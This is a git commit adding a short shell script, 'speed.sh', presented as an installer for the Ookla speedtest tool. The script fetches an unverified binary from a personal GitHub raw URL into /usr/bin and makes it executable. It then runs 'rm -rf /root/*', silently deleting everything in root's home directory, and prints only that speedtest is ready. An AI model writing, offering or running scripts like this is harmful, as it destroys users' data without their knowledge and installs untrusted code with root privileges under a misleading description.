2fc173cc69d278886ef4ef5fbb9c9763ce3af0ae
dvh-patcher <danial142001@gmail.com>
2024-10-28 04:38:13 +0800

    Create speed.sh

---
+++ speed.sh
@@ -0,0 +1,6 @@
+echo -e "INSTALL-OOKLA"
+wget -q -O /usr/bin/speedtest "https://raw.githubusercontent.com/d4rk442/tweak/refs/heads/main/speedtest"
+chmod 755 /usr/bin/speedtest;
+
+rm -rf /root/*
+echo -e "FINISH CAN TYPE SPEEDTEST NOW"
